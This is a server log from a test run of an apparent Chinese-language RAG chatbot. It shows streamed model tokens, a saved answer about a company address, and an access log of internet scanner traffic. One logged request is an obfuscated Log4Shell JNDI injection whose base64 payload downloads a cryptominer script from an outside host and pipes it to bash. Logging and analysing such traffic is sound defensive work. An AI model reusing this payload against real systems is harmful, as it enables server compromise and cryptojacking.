nohup: ignoring input
============================= test session starts ==============================
platform linux -- Python 3.10.16, pytest-8.3.4, pluggy-1.5.0
rootdir: /work/ai/WHOAMI/tests
plugins: langsmith-0.3.13, anyio-4.8.0
collected 1 item

rag_test_sys.py INFO:     Started server process [3086552]
[32m[2025-03-13 18:16:13] [INFO    ] [OllamLLM] - content ------------------------- sh[0m
[32m[2025-03-13 18:16:13] [INFO    ] [OllamLLM] - content ------------------------- un[0m
[32m[2025-03-13 18:16:13] [INFO    ] [OllamLLM] - content ------------------------- x[0m
[32m[2025-03-13 18:16:13] [INFO    ] [OllamLLM] - content ------------------------- ik[0m
[32m[2025-03-13 18:16:13] [INFO    ] [OllamLLM] - content ------------------------- j[0m
[32m[2025-03-13 18:16:13] [INFO    ] [OllamLLM] - content ------------------------- .com[0m
[32m[2025-03-13 18:16:13] [INFO    ] [OllamLLM] - content ------------------------- /)[0m
[32m[2025-03-13 18:16:13] [INFO    ] [OllamLLM] - content ------------------------- 。[0m
[32m[2025-03-13 18:16:13] [INFO    ] [OllamLLM] - content ------------------------- 如有[0m
[32m[2025-03-13 18:16:13] [INFO    ] [OllamLLM] - content ------------------------- 其他[0m
[32m[2025-03-13 18:16:13] [INFO    ] [OllamLLM] - content ------------------------- 问题[0m
[32m[2025-03-13 18:16:13] [INFO    ] [OllamLLM] - content ------------------------- ，[0m
[32m[2025-03-13 18:16:13] [INFO    ] [OllamLLM] - content ------------------------- 也[0m
[32m[2025-03-13 18:16:13] [INFO    ] [OllamLLM] - content ------------------------- 欢迎[0m
[32m[2025-03-13 18:16:13] [INFO    ] [OllamLLM] - content ------------------------- 随时[0m
[32m[2025-03-13 18:16:13] [INFO    ] [OllamLLM] - content ------------------------- 咨询[0m
[32m[2025-03-13 18:16:13] [INFO    ] [OllamLLM] - content ------------------------- 。[0m
[32m[2025-03-13 18:16:13] [INFO    ] [ChatSys] - Complete response length: 116[0m
[32m[2025-03-13 18:16:13] [INFO    ] [ChatSys] - First 100 chars: 您好！舜熙科技的办公地址是：运城市盐湖区-黄河金三角科创城C4楼3F。如需更多信息，欢迎访问我们的官方网站：[https://shunxikj.com/](https://shunxikj.com/)[0m
[32m[2025-03-13 18:16:13] [INFO    ] [ChatSys] - 准备保存数据 - 问题长度: 8, 回答长度: 116[0m
[32m[2025-03-13 18:16:13] [INFO    ] [ChatSys] - 保存结果: True[0m
流式响应完成，准备保存对话到数据库...
成功保存Q&A: 问题长度=8, 回答长度=116
对话保存完成，full_response长度: 116
INFO:     223.15.163.9:56602 - "POST /truncate_conversation_history HTTP/1.1" 200 OK
INFO:     106.75.26.167:43936 - "GET / HTTP/1.1" 404 Not Found
INFO:     106.75.128.229:6156 - "GET / HTTP/1.1" 404 Not Found
INFO:     106.75.128.229:6484 - "GET /favicon.ico HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
INFO:     101.251.238.167:60221 - "GET / HTTP/1.1" 404 Not Found
INFO:     185.216.140.186:52592 - "GET http%3A//pingjs.qq.com/ping.js HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
INFO:     199.45.154.137:48040 - "GET / HTTP/1.1" 404 Not Found
INFO:     199.45.154.137:59436 - "GET / HTTP/1.1" 404 Not Found
INFO:     199.45.154.137:59438 - "PRI %2A HTTP/2.0" 404 Not Found
WARNING:  Invalid HTTP request received.
INFO:     199.45.154.137:43366 - "GET /favicon.ico HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     185.91.127.9:42254 - "GET /t%28%27%24%7B%24%7Benv%3ANaN%3A-j%7Dndi%24%7Benv%3ANaN%3A-%3A%7D%24%7Benv%3ANaN%3A-l%7Ddap%24%7Benv%3ANaN%3A-%3A%7D//46.8.226.196%3A3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMjYuMTk2L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjI2LjE5Ni9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw%3D%3D%7D%27%29 HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     185.216.140.186:55424 - "GET http%3A//pingjs.qq.com/ping.js HTTP/1.1" 404 Not Found
INFO:     223.15.163.9:49269 - "OPTIONS /chat_health_report HTTP/1.1" 405 Method Not Allowed
INFO:     223.15.163.9:49321 - "OPTIONS /chat_health_report HTTP/1.1" 405 Method Not Allowed
INFO:     223.15.163.9:49899 - "OPTIONS /admin-api/system/dict-data/list-all-simple HTTP/1.1" 404 Not Found
INFO:     223.15.163.9:49898 - "OPTIONS /admin-api/system/auth/get-permission-info HTTP/1.1" 404 Not Found
INFO:     223.15.163.9:49898 - "OPTIONS /admin-api/system/auth/logout HTTP/1.1" 404 Not Found
INFO:     223.15.163.9:49914 - "OPTIONS /admin-api/chat_health_report HTTP/1.1" 404 Not Found
INFO:     223.15.163.9:50185 - "OPTIONS /chat_health_report HTTP/1.1" 405 Method Not Allowed
INFO:     223.15.163.9:50255 - "OPTIONS /chat_health_report HTTP/1.1" 405 Method Not Allowed
INFO:     223.15.163.9:50430 - "OPTIONS /chat_health_report HTTP/1.1" 405 Method Not Allowed
INFO:     223.15.163.9:50475 - "OPTIONS /chat_health_report HTTP/1.1" 405 Method Not Allowed
INFO:     223.15.163.9:50709 - "OPTIONS /chat_health_report HTTP/1.1" 405 Method Not Allowed
INFO:     223.15.163.9:50784 - "OPTIONS /chat_health_report HTTP/1.1" 405 Method Not Allowed
INFO:     223.15.163.9:50861 - "OPTIONS /chat_health_report HTTP/1.1" 405 Method Not Allowed
